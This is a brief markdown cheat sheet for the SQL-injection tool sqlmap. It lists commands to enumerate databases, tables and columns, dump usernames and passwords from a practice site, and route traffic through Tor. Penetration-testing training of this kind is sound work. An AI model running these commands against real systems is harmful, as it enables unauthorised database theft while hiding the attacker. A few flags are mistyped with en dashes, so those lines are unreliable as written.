# sqlmap


If you need to save some time, you can increase the number of threads used. Do note that this might affect the results for time-based related test.

> sqlmap -u "url" --threads=10

Batch is using the default option instead of waiting for the user’s input.

> sqlmap -u "url" --batch

You could also increase the risk and level value for sqlmap to test for more payloads.

> sqlmap -u "url" --risk=3 --level=5

Obtain the names of available databases

> sqlmap -u "url" --dbs

Specify the desired database using –D and tell SQLmap to list the tables using –tables command. So, the final SQLmap command will be:

> sqlmap -u 'url' -D db_name --tables

Specify the database using –D, table using – T and columns using –columns:
> sqlmap -u 'url' -D db_name -T table_name –columns

As usual, use –D for database, -T for table, -C for column and –dump for data. The final command to fetch data will appear as shownbelow:

> sqlmap -u 'http://testphp.vulnweb.com/listproducts.php?cat=1' -D acuart -T users -C phone,name,pass --dump

Add tor proxy. Type _tor_ in terminal and then 

> sqlmap .....  --tor

All options on sqlmap page
https://github.com/sqlmapproject/sqlmap/wiki/Usage
